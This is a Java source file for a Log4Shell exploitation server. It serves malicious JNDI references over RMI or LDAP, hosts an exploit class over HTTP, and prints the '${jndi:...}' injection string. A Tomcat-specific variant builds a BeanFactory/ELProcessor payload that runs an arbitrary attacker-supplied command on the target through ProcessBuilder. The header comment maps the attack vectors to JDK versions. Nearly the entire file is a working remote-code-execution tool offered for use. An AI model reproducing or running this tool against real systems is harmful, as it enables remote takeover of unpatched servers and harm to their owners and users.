import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

/*

Log4j exploitation analysis for version >=2.0 and <=2.15
//////////////////////////////////////////////////////////////////////////////////
There are different attack vectors that depends on the Java version in the target.

1- If jdk version < 8u121 -> RMI attack vector leading to execute any Java class.
2- If Jdk version >= 8u121 and < 8u191 -> LDAP vector leading to execute any Java class. RMI vector only works if the target has
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
3- If jdk version >= 8u191 -> LDAP vector only works if the target has
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
4- All jdk (in theory) -> Deserialization attack vector (its like a deserialization bug ,
depends on the packages in the classpath).

*/
/*TODO: This Server does no work with Java 11 */
public class LaunchServer {

    private static String RMIReference = "Foo";

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            message1();
            System.exit(0);
        }
        int serverType = 0;
        try {
            serverType = Integer.parseInt(args[0]);
        }
        catch (NumberFormatException e){
            System.out.println("- Wrong option -");
            message1();
            System.exit(0);
        }
        if (0 < serverType && serverType < 4){
            switch (serverType) {
                case 1:
                    if (checkServerParams(args,1)) {
                        System.out.println("- Starting HTTP Server -");
                        Thread threadHTTP = new Thread(new BasicHttpServer(args[1], Integer.parseInt(args[3]),args[4]));
                        threadHTTP.start();
                        System.out.println("- Starting RMI Server -");
                        rmi_server(args[1], args[2], "Exploit", "http://"+args[1]+":"+Integer.parseInt(args[3])+"/");
                    }
                    return;
                case 2:
                    if (checkServerParams(args,2)) {
                        System.out.println("- Starting HTTP Server -");
                        Thread threadHTTP = new Thread(new BasicHttpServer(args[1], Integer.parseInt(args[3]),args[4]));
                        threadHTTP.start();
                        System.out.println("- Starting LDAP Server -");
                        ldap_server(args[1],args[2], "http://"+args[1]+":"+Integer.parseInt(args[3])+"/#Exploit");
                    }
                    return;
                case 3:
                    if (checkServerParams(args,3)) {
                        System.out.println("- Starting RMI Server for Tomcat  -");
                        rmi_server_tomcat(args[1], args[2], args[3]);
                    }
                    return;
                default:
                    //Java code
                    ;
            }
        }else{
            System.out.println("- Wrong option -");
            message1();
            System.exit(0);
        }

    }

    private static void message1(){
        System.out.println("You need to select the server type first");
        System.out.println("Options: 1-RMI standard, 2-LDAP Server, 3-RMI for Tomcat");
    }
    private static void errorMessageRMI(){
        System.out.println("You need to provide RMI IP, RMI Port, HTTP port for hosting Exploit class and command to execute");
        System.out.println("Ex: <RMI IP> <RMI PORT> <HTTP_PORT> <COMMAND>");
    }
    private static void errorMessageLDAP(){
        System.out.println("You need to provide LDAP IP, LDAP Port, HTTP port for hosting Exploit class and command to execute");
        System.out.println("Ex: <LDAP IP> <LDAP PORT> <HTTP_PORT> <COMMAND> ");
    }
    private static void errorMessageRMI2(){
        System.out.println("You need to provide RMI IP, RMI Port and command to execute in the target");
        System.out.println("Ex: <RMI IP> <RMI PORT> <COMMAND>");
    }
    private static boolean checkServerParams(String[] args,int type){
        switch (type) {
            case 1:

                if (args.length != 5) {
                    errorMessageRMI();
                    return false;
                }
                return true;
            case 2:

                if (args.length != 5) {
                    errorMessageLDAP();
                    return false;
                }
                return true;
            case 3:
                if (args.length != 4) {
                    errorMessageRMI2();
                    return false;
                }
                return true;
            default:
                //Java code
                ;
        }
        return true;
    }

    public static void rmi_server(String ip, String port, String classname, String location){

        try {
            System.setProperty("java.rmi.server.hostname",ip);
            // Another alternative for testing is to create the registry here programmatically
            // but we do it programmatically here...
            Registry registry = LocateRegistry.createRegistry(Integer.parseInt(port));

            // Create a Properties object and set properties appropriately
            Properties props = new Properties();
            props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            props.put(Context.PROVIDER_URL, "rmi://"+ip+":"+port);

            // Create the initial context from the properties we just created
            Context ctx = new InitialContext(props);

            // Create JNDI Reference and set our evil remote factory class and the remote location
            // where the JVM can grab the class implementation
            Reference reference = new Reference("ExploitClass",
                    classname,
                    location);

            ReferenceWrapper wrapper = new ReferenceWrapper(reference);

            // Bind the object to the RMI Registry
            ctx.bind(LaunchServer.RMIReference, wrapper);

            System.out.println("- Reference bound! -");
            System.out.println("- RMI server started at "+ip+":"+port+" -");
            System.out.println("- Evil Class should be hosted at "+location+classname+" -");
            System.out.println("- Log4J Injection Path: "+"${jndi:rmi://"+ip+":"+port+"/"+LaunchServer.RMIReference+"}"+" -");
        } catch (Exception e) {
            System.err.println("An exception occurred!");
            e.printStackTrace();
        }
    }

    public static void ldap_server(String ip, String port, String location){
        LdapServer.start( ip, port, location);
    }

    //This server should be used exploit any java version using tomcat libs
    public static void rmi_server_tomcat(String ip, String port, String command) {
        try {
            // You should add this property for remote exploitation, instead
            // the RMI server only works in localhost.
            System.setProperty("java.rmi.server.hostname",ip);

            System.out.println("- Creating RMI Server on port "+port+" -");
            Registry registry = LocateRegistry.createRegistry(Integer.parseInt(port));

            Properties props = new Properties();
            props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            props.put(Context.PROVIDER_URL, "rmi://"+ip+":"+port);

            // Create the initial context from the properties
            Context ctx = new InitialContext(props);

            // Prepare payload that exploits reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            // Redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=eval"));
            // Expression language to execute something
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['"+command+"']).start()\")"));

            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
            ctx.bind(LaunchServer.RMIReference, referenceWrapper);
            System.out.println("- Reference bound! -");
            System.out.println("- RMI server started at "+ip+":"+port+" -");
            System.out.println("- Log4J Injection Path: "+"${jndi:rmi://"+ip+":"+port+"/"+LaunchServer.RMIReference+"}"+" -");
        } catch (Exception e) {
            System.err.println("An exception occurred!");
            e.printStackTrace();
        }
    }

}

